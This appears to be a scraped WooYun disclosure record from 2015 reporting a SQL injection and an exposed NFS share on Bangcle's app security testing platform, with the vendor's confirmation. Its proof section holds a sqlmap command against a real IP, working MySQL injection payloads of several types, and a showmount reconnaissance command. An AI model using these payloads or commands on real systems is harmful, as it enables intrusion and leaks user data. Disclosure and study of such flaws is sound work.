{"id": 23978, "wybug_id": "wooyun-2015-0113990", "wybug_title": "梆梆安检平台SQL漏洞造成潜在用户曝光另加一处nfs", "wybug_corp": "梆梆安全", "wybug_author": "J4nker", "wybug_date": "2015-05-14 11:54", "wybug_open_date": "2015-06-28 16:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向公众公开  简要描述： 梆梆安检平台SQL漏洞造成4W个app软件使用者名单曝光。直接好事竞争对手。 详细说明：     漏洞证明：  1.注入C:\\Python27\\sqlmap>sqlmap.py -u \"http://42.62.59.221:8081/result?id=54c9fe0d996c5824e43dd4edbc34aa76\" --dbms mysql --current-user         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20140909}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 22:26:01[22:26:01] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=54c9fe0d996c5824e43dd4edbc34aa76' AND 4724=4724 AND 'PbCO'='PbCO    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=54c9fe0d996c5824e43dd4edbc34aa76' AND (SELECT 9117 FROM(SELECT COUNT(*),CONCAT(0x7162676371,(SELECT (CASE WHEN (9117=9117) THEN 1 ELSE 0 END)),0x7175726c71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'uIev'='uIev    Type: UNION query    Title: MySQL UNION query (NULL) - 4 columns    Payload: id=-1535' UNION ALL SELECT NULL,NULL,CONCAT(0x7162676371,0x4b42445a4258424d4447,0x7175726c71),NULL#    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: id=54c9fe0d996c5824e43dd4edbc34aa76'; SELECT SLEEP(5)--    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=54c9fe0d996c5824e43dd4edbc34aa76' AND SLEEP(5) AND 'WtXF'='WtXF---[22:26:01] [INFO] testing MySQL[22:26:01] [INFO] confirming MySQL[22:26:01] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL >= 5.0.0[22:26:01] [INFO] fetching current usercurrent user:    'scanosclient@%'\n\n造成了4W个app用户名字泄露。直接把潜在客户让竞争对手知道。争夺资源。\n\n同样也有国际版外国的app。\n\n同服务器也有一台nfs漏洞。showmount -e 42.62.59.221/home/sec/project 192.168.1.* /home/sec/sharefolder 61.135.164.222    修复方案：  没有打理的地方要重新打理。   版权声明：转载请注明来源 J4nker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-14 16:20 厂商回复： 谢谢您的反馈，漏洞确认存在，已向公司跟您申请礼物，以表谢意！还望以后继续关注梆梆安全～ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}